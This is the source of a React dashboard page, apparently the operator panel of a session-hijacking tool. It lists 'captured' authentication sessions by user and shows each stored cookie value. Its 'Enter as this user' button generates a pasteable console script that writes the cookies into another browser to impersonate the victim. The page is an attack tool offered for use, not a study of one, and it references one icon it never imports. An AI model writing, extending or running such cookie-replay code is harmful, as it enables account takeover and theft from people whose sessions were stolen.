"use client";

import React, { useEffect, useState } from "react";
import { supabase, SessionSnapshot, Cookie } from "@/lib/supabase";
import GlassCard from "@/components/GlassCard";
import { Search, Filter, Clock, User, Globe, ExternalLink } from "lucide-react";

export default function SessionsPage() {
  const [sessions, setSessions] = useState<SessionSnapshot[]>([]);
  const [loading, setLoading] = useState(true);
  const [searchTerm, setSearchTerm] = useState("");
  const [selectedSession, setSelectedSession] = useState<SessionSnapshot | null>(null);
  const [cookies, setCookies] = useState<Cookie[]>([]);
  const [loadingCookies, setLoadingCookies] = useState(false);

  useEffect(() => {
    fetchSessions();
  }, []);

  const fetchSessions = async () => {
    setLoading(true);
    const { data, error } = await supabase
      .from("session_snapshots")
      .select("*")
      .order("captured_at", { ascending: false });
    
    if (data) setSessions(data);
    setLoading(false);
  };

  const fetchCookies = async (snapshotId: string) => {
    setLoadingCookies(true);
    const { data, error } = await supabase
      .from("cookies")
      .select("*")
      .eq("snapshot_id", snapshotId);
    
    if (data) setCookies(data);
    setLoadingCookies(false);
  };

  const handleSessionClick = (session: SessionSnapshot) => {
    setSelectedSession(session);
    fetchCookies(session.id);
  };

  const generateConsoleScript = () => {
    if (cookies.length === 0) return "";
    
    const script = `(function() {
  const cookies = ${JSON.stringify(cookies)};
  console.log('Restoring ' + cookies.length + ' cookies...');
  cookies.forEach(c => {
    try {
      // Basic restore via document.cookie
      let cookieStr = c.name + '=' + c.value + 
                      '; domain=' + c.domain + 
                      '; path=' + (c.path || '/') + 
                      '; SameSite=' + (c.same_site || 'Lax');
      if (c.secure) cookieStr += '; Secure';
      document.cookie = cookieStr;
    } catch (e) {
      console.error('Failed to set cookie: ' + c.name, e);
    }
  });
  console.log('Restoration complete. Reloading page...');
  location.reload();
})();`;

    navigator.clipboard.writeText(script);
    alert("Console script copied to clipboard! Paste it in the destination browser console.");
  };

  const filteredSessions = sessions.filter(s => 
    s.user_id?.toLowerCase().includes(searchTerm.toLowerCase())
  );

  return (
    <div className="space-y-8">
      <header className="flex items-center justify-between">
        <div>
          <h2 className="text-3xl font-bold tracking-tight">Captured Sessions</h2>
          <p className="text-gray-400">Manage and restore authentication snapshots.</p>
        </div>
      </header>

      <div className="grid grid-cols-1 lg:grid-cols-12 gap-8">
        <div className="lg:col-span-4 space-y-4">
          <div className="glass flex items-center px-4 py-2 rounded-2xl border border-white/10 focus-within:border-blue-500/50 transition-colors">
            <Search className="text-gray-500 mr-2" size={18} />
            <input 
              type="text" 
              placeholder="Search user..." 
              className="bg-transparent border-none outline-none text-sm w-full py-2"
              value={searchTerm}
              onChange={(e) => setSearchTerm(e.target.value)}
            />
          </div>

          <div className="space-y-3 h-[600px] overflow-y-auto pr-2 custom-scrollbar">
            {loading ? (
              [1, 2, 3].map(i => <div key={i} className="h-24 glass rounded-2xl animate-pulse" />)
            ) : filteredSessions.map((session) => (
              <div 
                key={session.id} 
                onClick={() => handleSessionClick(session)}
                className={"p-4 rounded-2xl cursor-pointer transition-all border " + (selectedSession?.id === session.id ? "glass border-blue-500/50 bg-blue-500/10" : "hover:bg-white/5 border-transparent")}
              >
                <div className="flex items-center gap-3 mb-2">
                  <div className="w-8 h-8 rounded-full bg-white/5 flex items-center justify-center text-gray-400">
                    <User size={14} />
                  </div>
                  <span className="font-semibold text-sm">{session.user_id}</span>
                </div>
                <div className="flex items-center justify-between text-xs text-gray-500">
                  <span className="flex items-center gap-1"><Clock size={12} /> {new Date(session.captured_at).toLocaleString()}</span>
                  <span className="glass-pill px-2 py-0.5 rounded-full">{session.snapshot_type}</span>
                </div>
              </div>
            ))}
          </div>
        </div>

        <div className="lg:col-span-8">
          {selectedSession ? (
            <GlassCard className="h-[684px] flex flex-col">
              <div className="flex items-center justify-between mb-6">
                <div>
                  <h3 className="text-xl font-bold">Session Details</h3>
                  <p className="text-sm text-gray-400">{selectedSession.user_id}  {cookies.length} cookies captured</p>
                </div>
                <button 
                  onClick={generateConsoleScript}
                  className="flex items-center gap-2 px-5 py-2.5 rounded-xl bg-blue-600 hover:bg-blue-500 transition-colors font-semibold text-sm shadow-lg shadow-blue-500/20"
                >
                  <ExternalLink size={16} />
                  Enter as this user
                </button>
              </div>

              <div className="flex-1 overflow-y-auto pr-2 custom-scrollbar">
                {loadingCookies ? (
                   <div className="flex flex-col items-center justify-center h-full gap-4 text-gray-500">
                     <div className="w-8 h-8 border-2 border-blue-500 border-t-transparent rounded-full animate-spin" />
                     <p>Loading cookies...</p>
                   </div>
                ) : (
                  <table className="w-full text-left text-sm">
                    <thead className="sticky top-0 bg-transparent backdrop-blur-md border-b border-white/10">
                      <tr>
                        <th className="py-3 font-medium text-gray-400">Domain</th>
                        <th className="py-3 font-medium text-gray-400">Name</th>
                        <th className="py-3 font-medium text-gray-400">Value</th>
                        <th className="py-3 font-medium text-gray-400 text-center uppercase text-[10px]">Sec</th>
                      </tr>
                    </thead>
                    <tbody className="divide-y divide-white/5">
                      {cookies.map((cookie, idx) => (
                        <tr key={idx} className="hover:bg-white/5 transition-colors">
                          <td className="py-3 truncate max-w-[150px]"><Globe size={12} className="inline mr-2 text-blue-400" /> {cookie.domain}</td>
                          <td className="py-3 font-mono text-xs">{cookie.name}</td>
                          <td className="py-3 truncate max-w-[200px] font-mono text-[10px] text-gray-400">{cookie.value}</td>
                          <td className="py-3 text-center">{cookie.secure ? "" : ""}</td>
                        </tr>
                      ))}
                    </tbody>
                  </table>
                )}
              </div>
            </GlassCard>
          ) : (
            <div className="h-[684px] glass rounded-3xl flex flex-col items-center justify-center text-gray-500 gap-4 border-dashed border-2 border-white/10">
              <div className="w-16 h-16 rounded-3xl bg-white/5 flex items-center justify-center">
                <Shield size={32} />
              </div>
              <p>Select a session to view cookies and restoration script</p>
            </div>
          )}
        </div>
      </div>
    </div>
  );
}
